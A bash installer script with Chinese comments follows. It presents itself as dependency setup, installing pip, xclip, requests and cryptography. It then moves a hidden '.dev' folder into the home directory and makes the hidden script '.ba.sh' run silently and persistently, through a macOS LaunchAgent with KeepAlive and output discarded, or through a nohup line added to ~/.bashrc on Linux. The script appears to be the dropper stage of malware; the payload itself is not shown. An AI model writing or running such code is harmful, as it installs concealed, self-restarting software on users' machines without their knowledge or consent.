#!/bin/bash

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") # mac
            # 检查 Homebrew 是否安装
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            # 检查并安装必需的包
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            # macOS 自带 pbcopy/pbpaste，无需安装额外的剪贴板工具
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                sudo apt update
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
install_dependencies

# 检查并安装 requests
if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
    pip3 install --break-system-packages 'requests>=2.31.0'
fi

# 检查并安装 cryptography（用于 Fernet）
if ! pip3 show cryptography >/dev/null 2>&1; then
    pip3 install --break-system-packages cryptography
fi

# 设置自启动
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"

    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"
    chmod +x "$DEST_DIR/conf/.ba.sh"

    # 定义执行命令
    EXEC_CMD="/bin/bash"
    SCRIPT_PATH="$DEST_DIR/conf/.ba.sh"

    case $OS_TYPE in
        "Darwin")
            # 创建 LaunchAgents 目录（如果不存在）
            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
            mkdir -p "$LAUNCH_AGENTS_DIR"
            
            # 创建 plist 文件
            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
            cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.ba</string>
    <key>ProgramArguments</key>
    <array>
        <string>$EXEC_CMD</string>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
            # 加载 plist
            launchctl load "$PLIST_FILE"
            ;;
            
        "Linux")
            BASHRC_ENTRY="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &\nfi"
            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
                echo -e "\n$BASHRC_ENTRY" >> "$HOME/.bashrc"
                # 直接启动脚本，而不是重新加载 bash
                if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
                    nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &
                fi
            fi
            ;;
    esac
fi
